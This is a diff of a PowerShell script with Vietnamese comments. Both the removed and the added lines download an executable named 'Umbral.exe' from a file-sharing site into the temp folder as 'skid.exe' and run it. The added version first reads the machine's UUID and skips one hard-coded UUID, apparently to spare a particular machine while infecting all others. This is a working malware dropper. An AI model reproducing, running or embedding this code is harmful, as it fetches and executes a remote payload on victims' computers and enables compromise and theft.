@@ -28,5 +28,19 @@ Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEac
 }
 
 
-Invoke-WebRequest -Uri "https://anonsharing.com/file/c24bdc0c7b314dfd/Umbral.exe" -OutFile "$temp\skid.exe"
-Start-Process -FilePath "$temp\skid.exe"
+# Lấy UUID của máy tính
+$uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+
+# UUID mà bạn muốn kiểm tra
+$blockedUUID = "4C4C4544-0050-3110-8051-C6C04F344632"
+
+# So sánh UUID
+if ($uuid -eq $blockedUUID) {
+    Write-Host "UUID của máy tính bị chặn. Không thực hiện hành động."
+} else {
+    # Nếu UUID không khớp, tải và chạy tập tin
+    $temp = [System.IO.Path]::GetTempPath()
+    Invoke-WebRequest -Uri "https://anonsharing.com/file/c24bdc0c7b314dfd/Umbral.exe" -OutFile "$temp\skid.exe"
+    Start-Process -FilePath "$temp\skid.exe"
+}
+
